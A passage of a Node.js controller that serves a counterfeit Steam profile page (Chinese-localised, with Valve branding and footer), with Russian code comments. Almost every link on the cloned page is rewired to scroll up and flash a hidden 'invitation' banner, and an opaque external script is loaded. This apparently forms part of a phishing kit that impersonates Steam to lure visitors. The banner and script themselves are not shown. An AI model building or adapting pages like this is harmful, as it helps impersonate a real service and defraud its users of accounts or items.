                        data-panel='{"focusable":true,"clickOnActivate":true}'
                        class="profile_count_link ellipsis"
                      >
                        <a onclick="scrollToTop()">
                          <span class="count_link_label">创意工坊物品</span
                          >&nbsp;
                          <span class="profile_count_link_total"> 7 </span>
                        </a>
                      </div>
                      <div
                        data-panel='{"focusable":true,"clickOnActivate":true}'
                        class="profile_count_link ellipsis"
                      >
                        <a onclick="scrollToTop()">
                          <span class="count_link_label">评测</span>&nbsp;
                          <span class="profile_count_link_total"> 3 </span>
                        </a>
                      </div>
                      <div
                        data-panel='{"focusable":true,"clickOnActivate":true}'
                        class="profile_count_link ellipsis"
                      >
                        <a onclick="scrollToTop()">
                          <span class="count_link_label">艺术作品</span>&nbsp;
                          <span class="profile_count_link_total"> 2 </span>
                        </a>
                      </div>
                      <div style="clear: left"></div>
                    </div>
                  </div>

                  <div
                    class="profile_group_links profile_count_link_preview_ctn responsive_groupfriends_element"
                    data-panel='{"focusable":true,"clickOnActivate":true}'
                  >
                    <div
                      data-panel='{"focusable":true,"clickOnActivate":true}'
                      class="profile_count_link ellipsis"
                    >
                      <a onclick="scrollToTop()">
                        <span class="count_link_label">组</span>&nbsp;
                        <span class="profile_count_link_total"> 5 </span>
                      </a>
                    </div>
                    <div class="profile_count_link_preview">
                      <div class="profile_group profile_primary_group">
                        <div class="profile_group_avatar">
                          <a onclick="scrollToTop()">
                            <img
                              src="./img/fef49e7fa7e1997310d705b2a6158ff8dc1cdfeb_medium.jpg"
                            />
                          </a>
                        </div>
                        <a class="whiteLink" onclick="scrollToTop()">
                          WallJuns
                        </a>
                        <div class="profile_group_membercount">1 名成员</div>
                        <div style="clear: left"></div>
                      </div>
                      <div class="profile_group">
                        <div class="profile_group_avatar">
                          <a onclick="scrollToTop()">
                            <img
                              src="./img/cf3cc501e2cd6517c158617c07719c5e14cd553c.jpg"
                            />
                          </a>
                        </div>
                        <a class="whiteLink" onclick="scrollToTop()">
                          CYBERSHOKE🏆
                        </a>
                        <div class="profile_group_membercount">
                          133,463 名成员
                        </div>
                        <div style="clear: left"></div>
                      </div>
                      <div class="profile_group">
                        <div class="profile_group_avatar">
                          <a onclick="scrollToTop()">
                            <img
                              src="./img/fef49e7fa7e1997310d705b2a6158ff8dc1cdfeb.jpg"
                            />
                          </a>
                        </div>
                        <a class="whiteLink" onclick="scrollToTop()">
                          =Unreal= Servers
                        </a>
                        <div class="profile_group_membercount">
                          25,293 名成员
                        </div>
                        <div style="clear: left"></div>
                      </div>
                    </div>
                  </div>

                  </div>
                </div>

                <div class="profile_leftcol">
                  <div class="profile_customization_area">
                    <div
                      data-panel='{"type":"PanelGroup"}'
                      class="profile_customization"
                    >
                      <div class="profile_customization_header">物品展柜</div>
                      <div class="profile_customization_block">
                        <div class="item_showcase">
                          <div class="">
                            <div
                              data-panel='{"flow-children":"grid"}'
                              class="showcase_slot_row"
                            >
                              <div
                                class="showcase_slot item_showcase_item"
                                style="border-color: transparent"
                                data-economy-item="classinfo/753/5594172749/3865004543"
                              >
                                <a onclick="scrollToTop()">
                                  <img
                                    class="item_image"
                                    src="./img/i0CoZ81Ui0m.png"
                                  />
                                </a>
                              </div>
                              <div
                                class="showcase_slot item_showcase_item"
                                style="border-color: transparent"
                                data-economy-item="classinfo/753/5594167785/3865004543"
                              >
                                <a onclick="scrollToTop()">
                                  <img
                                    class="item_image"
                                    src="./img/BmYn6cGXXMFHnuylQbw.png"
                                  />
                                </a>
                              </div>
                              <div
                                class="showcase_slot item_showcase_item"
                                style="border-color: transparent"
                                data-economy-item="classinfo/753/5594172796/3873503133"
                              >
                                <a onclick="scrollToTop()">
                                  <img
                                    class="item_image"
                                    src="./img/eGXXMFHJEIGu6g.png"
                                  />
                                </a>
                              </div>
                              <div
                                class="showcase_slot item_showcase_item"
                                style="border-color: transparent"
                                data-economy-item="classinfo/753/5594170365/3865004543"
                              >
                                <a onclick="scrollToTop()">
                                  <img
                                    class="item_image"
                                    src="./img/4jyAyNeqdWXXMFHwIJkocA.png"
                                  />
                                </a>
                              </div>
                              <div
                                class="showcase_slot item_showcase_item"
                                style="border-color: transparent"
                                data-economy-item="classinfo/753/5594169919/3865004543"
                              >
                                <a onclick="scrollToTop()">
                                  <img
                                    class="item_image"
                                    src="./img/6eGXXMFGsrq26sw.png"
                                  />
                                </a>
                              </div>
                              <div
                                class="showcase_slot item_showcase_item"
                                style="border-color: transparent"
                                data-economy-item="classinfo/753/5594167782/3865004543"
                              >
                                <a onclick="scrollToTop()">
                                  <img
                                    class="item_image"
                                    src="./img/JWXXMFHnj2dCKA.png"
                                  />
                                </a>
                              </div>
                              <!--
                    <div style="clear: left;"></div>
                    </div><div class="showcase_slot_row">
                    -->
                              <div
                                class="showcase_slot item_showcase_item"
                                style="border-color: #d2d2d2"
                                data-economy-item="classinfo/730/5770443118"
                              >
                                <a onclick="scrollToTop()">
                                  <img
                                    class="item_image"
                                    src="./img/96fx96f.png"
                                    srcset="
                                      ./img/96fx96f.png      1x,
                                      ./img/96fx96f.png 2x
                                    "
                                  />
                                </a>
                              </div>
                              <div
                                class="showcase_slot item_showcase_item"
                                style="border-color: #d2d2d2"
                                data-economy-item="classinfo/730/5537026494"
                              >
                                <a onclick="scrollToTop()">
                                  <img
                                    class="item_image"
                                    src="./img/D6ux07ellOukQ.png"
                                    srcset="
                                      ./img/D6ux07ellOukQ.png 1x,
                                      ./img/D6ux07ellOukQ.png 2x
                                    "
                                  />
                                </a>
                              </div>
                              <div
                                class="showcase_slot item_showcase_item"
                                style="border-color: #d2d2d2"
                                data-economy-item="classinfo/730/5137072796/5644890748"
                              >
                                <a onclick="scrollToTop()">
                                  <img
                                    class="item_image"
                                    src="./img/96fx96f3.png"
                                    srcset="
                                      ./img/96fx96f3.png 1x,
                                      ./img/96fx96f3.png 2x
                                    "
                                  />
                                </a>
                              </div>
                              <div
                                class="showcase_slot item_showcase_item"
                                style="border-color: #d2d2d2"
                                data-economy-item="classinfo/730/3472084247"
                              >
                                <a honclick="scrollToTop()">
                                  <img
                                    class="item_image"
                                    src="./img/96fx96f4.png"
                                    srcset="
                                      ./img/96fx96f4.png 1x,
                                      ./img/96fx96f4.png 2x
                                    "
                                  />
                                </a>
                              </div>
                              <a
                                class="showcase_stat item_count_stat"
                                onclick="scrollToTop()"
                              >
                                <div class="value">187</div>
                                <div class="label">已拥有的物品数</div>
                              </a>
                              <div style="clear: left"></div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div class="profile_customization">
                      <div class="profile_customization_header">成就展柜</div>
                      <div class="profile_customization_block">
                        <div class="achievement_showcase">
                          <div class="showcase_content_bg">
                            <div
                              class="showcase_slot showcase_achievement"
                              data-tooltip-html="Zup! S<br>
L!<br>
Pass the level L!"
                            >
                              <a onclick="scrollToTop()">
                                <img
                                  src="./img/fbcfd7d1bf6a09b8f9979949368219f692efc36f.jpg"
                                />
                              </a>
                            </div>
                            <div
                              class="showcase_slot showcase_achievement"
                              data-tooltip-html="Zup! S<br>
E!<br>
Pass the level E!"
                            >
                              <a onclick="scrollToTop()">
                                <img
                                  src="./img/75c20a54db03989d179d218d42a1b6d7a439810d.jpg"
                                />
                              </a>
                            </div>
                            <div
                              class="showcase_slot showcase_achievement"
                              data-tooltip-html="Zup! S<br>
Pass the level V!"
                            >
                              <a onclick="scrollToTop()">
                                <img
                                  src="./img/f35705e3c7a96829ddec0cff0909f1777a2c14e8.jpg"
                                />
                              </a>
                            </div>
                            <div
                              class="showcase_slot showcase_achievement"
                              data-tooltip-html="Zup! S<br>
E!<br>
Pass the level E!"
                            >
                              <a onclick="scrollToTop()">
                                <img
                                  src="./img/75c20a54db03989d179d218d42a1b6d7a439810d.jpg"
                                />
                              </a>
                            </div>
                            <div
                              class="showcase_slot showcase_achievement"
                              data-tooltip-html="Zup! S<br>
E!<br>
Pass the level E!"
                            >
                              <a onclick="scrollToTop()">
                                <img
                                  src="./img/75c20a54db03989d179d218d42a1b6d7a439810d.jpg"
                                />
                              </a>
                            </div>
                            <div
                              class="showcase_slot showcase_achievement"
                              data-tooltip-html="Zup! S<br>
V!<br>
Pass the level V!"
                            >
                              <a onclick="scrollToTop()">
                                <img
                                  src="./img/f35705e3c7a96829ddec0cff0909f1777a2c14e8.jpg"
                                />
                              </a>
                            </div>
                            <div
                              class="showcase_slot showcase_achievement"
                              data-tooltip-html="Zup! S<br>
A!<br>
Pass the level A!"
                            >
                              <a onclick="scrollToTop()">
                                <img
                                  src="./img/5f95ba61f54fdb6c7e3b083e792c67f2036221b3.jpg"
                                />
                              </a>
                            </div>
                            <div style="clear: left"></div>
                          </div>
                          <div class="showcase_content_bg showcase_stats_row">
                            <div
                              class="showcase_stat"
                              data-tooltip-text="在 36 个不同游戏中达成 9,895 个成就。"
                            >
                              <div class="value">9,895</div>
                              <div class="label">成就</div>
                            </div>
                            <a
                              class="showcase_stat"
                              onclick="scrollToTop()"
                              data-tooltip-text="获得一款游戏全部成就的游戏数。"
                            >
                              <div class="value">25</div>
                              <div class="label">完美达成的游戏数</div>
                            </a>
                            <div
                              class="showcase_stat"
                              data-tooltip-text="每个游戏所获成就的平均百分比。"
                            >
                              <a class="showcase_stat" onclick="scrollToTop()">
                                <div class="value">77%</div>
                                <div class="label">游戏平均完成率</div>
                              </a>
                            </div>
                            <div style="clear: left"></div>
                          </div>
                        </div>
                        <div style="clear: both"></div>
                      </div>
                    </div>
                    <div class="profile_customization">
                      <div class="profile_customization_header">
                        打算交易的物品
                      </div>
                      <div class="profile_customization_block">
                        <div class="trade_showcase">
                          <div class="showcase_slot_row trade_showcase_items">
                            <div style="clear: left"></div>
                          </div>

                          <div class="showcase_content_bg">
                            <div
                              class="showcase_stats_row showcase_stats_trading"
                            >
                              <a class="showcase_stat" onclick="scrollToTop()">
                                <div class="value">187</div>
                                <div class="label">已拥有的物品数</div>
                              </a>
                              <div class="showcase_stat">
                                <div class="value">150</div>
                                <div class="label">已进行的交易次数</div>
                              </div>
                              <div class="showcase_stat">
                                <div class="value">3,231</div>
                                <div class="label">市场交易次数</div>
                              </div>
                              <div style="clear: left"></div>
                            </div>

                            <div class="showcase_notes"></div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div class="profile_customization">
                    <div
                      class="profile_recentgame_header profile_customization_header"
                    >
                      <div>最新动态</div>
                      <div
                        class="recentgame_quicklinks recentgame_recentplaytime"
                      >
                        <div>43.2 小时（过去 2 周）</div>
                      </div>
                    </div>
                    <div class="profile_customization_block">
                      <div class="recent_games">
                        <div class="recent_game">
                          <div
                            data-panel='{"type":"PanelGroup"}'
                            class="recent_game_content"
                          >
                            <div class="game_info">
                              <div class="game_info_cap">
                                <a onclick="scrollToTop()"
                                  ><img
                                    class="game_capsule"
                                    src="./img/capsule_184x69_schinese.jpg"
                                /></a>
                              </div>
                              <div class="game_info_details">
                                总时数 1,003 小时<br />
                                最后运行日期：10 月 26 日
                              </div>
                              <div class="game_name">
                                <a class="whiteLink" onclick="scrollToTop()"
                                  >Counter-Strike 2</a
                                >
                              </div>
                            </div>

                            <div class="game_info_stats">
                              <div class="game_info_achievements_badge">
                                <!-- only badge, no achievements -->
                                <div class="game_info_badge_border">
                                  <div class="game_info_badge">
                                    <div class="game_info_badge_icon">
                                      <a onclick="scrollToTop()">
                                        <img
                                          src="./img/8203d824739e19c69aa4e33d761ce53a16159d19.png"
                                          class="badge_icon small"
                                        />
                                      </a>
                                    </div>
                                    <div class="game_info_badge_description">
                                      <div class="name">
                                        <a
                                          class="whiteLink"
                                          onclick="scrollToTop()"
                                          >Elite Crewman</a
                                        >
                                      </div>
                                      <div class="xp">100 点经验值</div>
                                    </div>
                                  </div>
                                </div>
                                <div class="game_info_achievements">
                                  <div
                                    class="game_info_achievements_summary_area"
                                  >
                                    <span class="game_info_achievement_summary">
                                      <a
                                        class="whiteLink"
                                        onclick="scrollToTop()"
                                        >成就进度</a
                                      >
                                      &nbsp; <span class="ellipsis">1 / 1</span>
                                    </span>
                                    <div class="achievement_progress_bar_ctn">
                                      <div
                                        class="progress_bar"
                                        style="width: 100%"
                                      ></div>
                                    </div>
                                  </div>
                                  <div class="achievement_icons">
                                    <div
                                      class="game_info_achievement"
                                      data-tooltip-text="全新的开始"
                                    >
                                      <a onclick="scrollToTop()">
                                        <img
                                          src="./img/f75dd04fa12445a8ec43be65fa16ff1b8d2bf82e.jpg"
                                        />
                                      </a>
                                    </div>
                                  </div>
                                </div>
                                <div style="clear: both"></div>
                              </div>
                              <div class="game_info_stats_rule"></div>
                              <div class="game_info_stats_publishedfilecounts">
                                <span class="published_file_count_ctn">
                                  <span
                                    class="published_file_icon screenshot"
                                  ></span>
                                  <a
                                    class="published_file_link"
                                    onclick="scrollToTop()"
                                    >截图数 7</a
                                  >
                                </span>
                                <span class="published_file_count_ctn">
                                  <span
                                    class="published_file_icon recommendation"
                                  ></span>
                                  <a
                                    class="published_file_link"
                                    onclick="scrollToTop()"
                                    >评测 1</a
                                  >
                                </span>
                              </div>
                            </div>
                          </div>
                        </div>
                        <div class="recent_game">
                          <div
                            data-panel='{"type":"PanelGroup"}'
                            class="recent_game_content"
                          >
                            <div class="game_info">
                              <div class="game_info_cap">
                                <a onclick="scrollToTop()"
                                  ><img
                                    class="game_capsule"
                                    src="./img/capsule_184x69.jpg"
                                /></a>
                              </div>
                              <div class="game_info_details">
                                总时数 379 小时<br />
                                最后运行日期：10 月 26 日
                              </div>
                              <div class="game_name">
                                <a class="whiteLink" onclick="scrollToTop()"
                                  >BeamNG.drive</a
                                >
                              </div>
                            </div>

                            <div class="game_info_stats">
                              <div class="game_info_achievements_badge">
                                <!-- only badge, no achievements -->
                                <div class="game_info_badge_border">
                                  <div class="game_info_badge">
                                    <div class="game_info_badge_icon">
                                      <a honclick="scrollToTop()">
                                        <img
                                          src="./img/6b802dfaafcbaca37c60c6bad4bde07e536099e2.png"
                                          class="badge_icon small"
                                        />
                                      </a>
                                    </div>
                                    <div class="game_info_badge_description">
                                      <div class="name">
                                        <a
                                          class="whiteLink"
                                          onclick="scrollToTop()"
                                          >Magnesium</a
                                        >
                                      </div>
                                      <div class="xp">100 点经验值</div>
                                    </div>
                                  </div>
                                </div>
                                <div class="game_info_achievements">
                                  <div
                                    class="game_info_achievements_summary_area"
                                  >
                                    <span class="game_info_achievement_summary">
                                      <a
                                        class="whiteLink"
                                        onclick="scrollToTop()"
                                        >成就进度</a
                                      >
                                      &nbsp; <span class="ellipsis">4 / 4</span>
                                    </span>
                                    <div class="achievement_progress_bar_ctn">
                                      <div
                                        class="progress_bar"
                                        style="width: 100%"
                                      ></div>
                                    </div>
                                  </div>
                                  <div class="achievement_icons">
                                    <div
                                      class="game_info_achievement"
                                      data-tooltip-text="扶摇直上"
                                    >
                                      <a onclick="scrollToTop()">
                                        <img
                                          src="./img/b2e0fb86240a1c8fa8ece74b700a14ccfb6dc4fe.jpg"
                                        />
                                      </a>
                                    </div>
                                    <div
                                      class="game_info_achievement"
                                      data-tooltip-text="新手上路"
                                    >
                                      <a onclick="scrollToTop()">
                                        <img
                                          src="./img/a2f99230dec914acd04ec313b07e0d752983f403.jpg"
                                        />
                                      </a>
                                    </div>
                                    <div
                                      class="game_info_achievement"
                                      data-tooltip-text="卓越表现"
                                    >
                                      <a onclick="scrollToTop()">
                                        <img
                                          src="./img/c6c0a9ed8791bdc0bf1ddca76e2be7590ededdb5.jpg"
                                        />
                                      </a>
                                    </div>
                                    <div
                                      class="game_info_achievement"
                                      data-tooltip-text="无情毁灭者"
                                    >
                                      <a onclick="scrollToTop()">
                                        <img
                                          src="./img/c1f9a4011ae3e4b5e0161f8c6736e2a11cfb7bd5.jpg"
                                        />
                                      </a>
                                    </div>
                                  </div>
                                </div>
                                <div style="clear: both"></div>
                              </div>
                              <div class="game_info_stats_rule"></div>
                              <div class="game_info_stats_publishedfilecounts">
                                <span class="published_file_count_ctn">
                                  <span
                                    class="published_file_icon screenshot"
                                  ></span>
                                  <a
                                    class="published_file_link"
                                    onclick="scrollToTop()"
                                    >截图数 17</a
                                  >
                                </span>
                                <span class="published_file_count_ctn">
                                  <span
                                    class="published_file_icon recommendation"
                                  ></span>
                                  <a
                                    class="published_file_link"
                                    onclick="scrollToTop()"
                                    >评测 1</a
                                  >
                                </span>
                              </div>
                            </div>
                          </div>
                        </div>
                        <div class="recent_game">
                          <div
                            data-panel='{"type":"PanelGroup"}'
                            class="recent_game_content"
                          >
                            <div class="game_info">
                              <div class="game_info_cap">
                                <a onclick="scrollToTop()"
                                  ><img
                                    class="game_capsule"
                                    src="./img/capsule_184x69_schinese2.jpg"
                                /></a>
                              </div>
                              <div class="game_info_details">
                                总时数 157 小时<br />
                                最后运行日期：10 月 26 日
                              </div>
                              <div class="game_name">
                                <a class="whiteLink" onclick="scrollToTop()"
                                  >Wallpaper Engine：壁纸引擎</a
                                >
                              </div>
                            </div>

                            <div class="game_info_stats">
                              <div class="game_info_achievements_badge">
                                <!-- only badge, no achievements -->
                                <div class="game_info_badge_border">
                                  <div class="game_info_badge">
                                    <div class="game_info_badge_icon">
                                      <a onclick="scrollToTop()">
                                        <img
                                          src="./img/3ac817cd2904e822e0801ce9fe59a94551d4d4ca.png"
                                          class="badge_icon small"
                                        />
                                      </a>
                                    </div>
                                    <div class="game_info_badge_description">
                                      <div class="name">
                                        <a
                                          class="whiteLink"
                                          onclick="scrollToTop()"
                                          >Warmonger</a
                                        >
                                      </div>
                                      <div class="xp">500 点经验值</div>
                                    </div>
                                  </div>
                                </div>
                                <div class="game_info_achievements">
                                  <div
                                    class="game_info_achievements_summary_area"
                                  >
                                    <span class="game_info_achievement_summary">
                                      <a
                                        class="whiteLink"
                                        onclick="scrollToTop()"
                                        >成就进度</a
                                      >
                                      &nbsp;
                                      <span class="ellipsis">17 / 17</span>
                                    </span>
                                    <div class="achievement_progress_bar_ctn">
                                      <div
                                        class="progress_bar"
                                        style="width: 100%"
                                      ></div>
                                    </div>
                                  </div>
                                  <div class="achievement_icons">
                                    <div
                                      class="game_info_achievement"
                                      data-tooltip-text="壁纸鉴赏家"
                                    >
                                      <a onclick="scrollToTop()">
                                        <img
                                          src="./img/8e56c301216c03a675b4441942fa143ced7c9ee8.jpg"
                                        />
                                      </a>
                                    </div>
                                    <div
                                      class="game_info_achievement"
                                      data-tooltip-text="不错的收藏夹"
                                    >
                                      <a onclick="scrollToTop()">
                                        <img
                                          src="./img/893e157fe5efed6fb37e012e80079b2b07e902ef.jpg"
                                        />
                                      </a>
                                    </div>
                                    <div
                                      class="game_info_achievement"
                                      data-tooltip-text="你们成功引起了我的注意"
                                    >
                                      <a onclick="scrollToTop()">
                                        <img
                                          src="./img/b94c0f896de24c4bb8fc3a040f5e62a6df69d8d0.jpg"
                                        />
                                      </a>
                                    </div>
                                    <div
                                      class="game_info_achievement"
                                      data-tooltip-text="k0n4m1"
                                    >
                                      <a onclick="scrollToTop()">
                                        <img
                                          src="./img/f9aa5e3dd5e28e9e1275369ecfea3961f449f53c.jpg"
                                        />
                                      </a>
                                    </div>
                                    <div
                                      class="game_info_achievement"
                                      data-tooltip-text="有毒吧"
                                    >
                                      <a onclick="scrollToTop()">
                                        <img
                                          src="./img/1f519ad16689ebdd4860d548f0979ada9e739ef5.jpg"
                                        />
                                      </a>
                                    </div>
                                    <div
                                      data-panel='{"focusable":true,"clickOnActivate":true}'
                                      class="game_info_achievement plus_more"
                                      onclick="window.location='https://steamcommunity.com/profiles/76561199224753700/stats/431960/achievements/'"
                                    >
                                      +12
                                    </div>
                                  </div>
                                </div>
                                <div style="clear: both"></div>
                              </div>
                              <div class="game_info_stats_rule"></div>
                              <div class="game_info_stats_publishedfilecounts">
                                <span class="published_file_count_ctn">
                                  <span
                                    class="published_file_icon workshop_item"
                                  ></span>
                                  <a
                                    class="published_file_link"
                                    onclick="scrollToTop()"
                                    >提交的创意工坊项目数 2</a
                                  >
                                </span>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div>
                        <div class="recentgame_quicklinks">
                          查看
                          <a class="whiteLink" onclick="scrollToTop()"
                            >所有最近玩过的</a
                          >
                          <span class="link_separator">|</span>
                          <a class="whiteLink" onclick="scrollToTop()"
                            >愿望单</a
                          >
                          <span class="link_separator">|</span>
                          <a class="whiteLink" onclick="scrollToTop()">评测</a>
                        </div>
                        <div style="clear: right"></div>
                      </div>
                    </div>
                  </div>

                          </div>
                        </div>
                      </div>
                      <div
                        class="commentthread_footer"
                        id="commentthread_Profile_76561199224753700_fpagecontrols"
                      >
                        <div
                          class="commentthread_paging"
                          id="commentthread_Profile_76561199224753700_fpagecontrols"
                        >
                          <a
                            id="commentthread_Profile_76561199224753700_fpagebtn_prev"
                            href="javascript:void(0);"
                            class="pagebtn"
                            >&lt;</a
                          >
                          <span
                            id="commentthread_Profile_76561199224753700_fpagelinks"
                            class="commentthread_pagelinks"
                          ></span>
                          <span
                            id="commentthread_Profile_76561199224753700_fpagedropdown"
                            class="commentthread_pagedropdown"
                          ></span>
                          <a
                            id="commentthread_Profile_76561199224753700_fpagebtn_next"
                            href="javascript:void(0);"
                            class="pagebtn"
                            >&gt;</a
                          >
                        </div>
                        <div style="clear: both"></div>
                      </div>
                    </div>
                  </div>
                </div>

                <div style="clear: both"></div>
              </div>
            </div>
          </div>
        </div>
        <!-- responsive_page_legacy_content -->
        <div id="footer_spacer" class=""></div>
        <div id="footer_responsive_optin_spacer"></div>
        <div id="footer">
          <div class="footer_content">
            <span id="footerLogo"
              ><img
                src="./img/footerLogo_valve.png"
                width="96"
                height="26"
                border="0"
                alt="Valve 徽标"
            /></span>
            <span id="footerText">
              © Valve
              Corporation。保留所有权利。所有商标均为其在美国及其它国家/地区的各自持有者所有。
              本网站上部分地理空间数据由
              <a
                href="https://steamcommunity.com/linkfilter/?u=http%3A%2F%2Fwww.geonames.org"
                target="_blank"
                rel=" noopener"
                >geonames.org</a
              >
              提供。 <br />
              <span class="valve_links">
                <a onclick="scrollToTop()" target="_blank">隐私政策</a>
                &nbsp; | &nbsp;<a onclick="scrollToTop()" target="_blank"
                  >法律信息</a
                >
                &nbsp;| &nbsp;<a onclick="scrollToTop()" target="_blank"
                  >Steam 订户协议</a
                >
                &nbsp;| &nbsp;<a onclick="scrollToTop()" target="_blank"
                  >Cookie</a
                >
              </span>
            </span>
          </div>
          <div class="responsive_optin_link">
            <div
              class="btn_medium btnv6_grey_black"
              onclick="Responsive_RequestMobileView()"
            >
              <span>查看移动版网站</span>
            </div>
          </div>
        </div>
      </div>
      <!-- responsive_page_content -->
    </div>
    <!-- responsive_page_frame -->
    <script>
      function scrollToTop() {
        document.body.scrollTop = 0
        document.documentElement.scrollTop = 0
        var banner = document.getElementById('priglasitelny_banner')
        banner.classList.add('priglasitelny2_banner')

        // Убираем мигание через 2 секунды
        setTimeout(function () {
          banner.classList.remove('priglasitelny2_banner')
        }, 2000)
      }
    </script>
    <script>
  const level = parseInt('${steamData.level}', 10); // Преобразуем уровень в число
  const levelDiv = document.getElementById('levelClass');
  
  if (level >= 0 && level < 10) {
    levelDiv.classList.add('lvl_1');
  } else if (level >= 10 && level < 20) {
    levelDiv.classList.add('lvl_10');
  } else if (level >= 20 && level < 30) {
    levelDiv.classList.add('lvl_20');
  } else if (level >= 30 && level < 40) {
    levelDiv.classList.add('lvl_30');
  } else if (level >= 40 && level < 50) {
    levelDiv.classList.add('lvl_40');
  } else if (level >= 50 && level < 60) {
    levelDiv.classList.add('lvl_50');
  } else if (level >= 60 && level < 70) {
    levelDiv.classList.add('lvl_60');
  } else if (level >= 70 && level < 80) {
    levelDiv.classList.add('lvl_70');
  } else if (level >= 80 && level < 90) {
    levelDiv.classList.add('lvl_80');
  } else if (level >= 90 && level < 100) {
    levelDiv.classList.add('lvl_90');
  } else if (level >= 100 && level <= 6000) {
    levelDiv.classList.add('lvl_100');
  } else {
    levelDiv.classList.add('lvl_unknown'); // Для непредвиденных значений
  }
</script>
    <script src="./ldg1vqx3pqt8.js"></script>
  </body>
</html>
    `
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    
    // Отправляем PHP-код как содержимое ответа
    res.send(phpContent);
  } catch (error) {
    console.error('Error fetching data:', error);
    res.status(500).send('Error fetching data');
  }
};

module.exports = { getSteamProfileByToken };
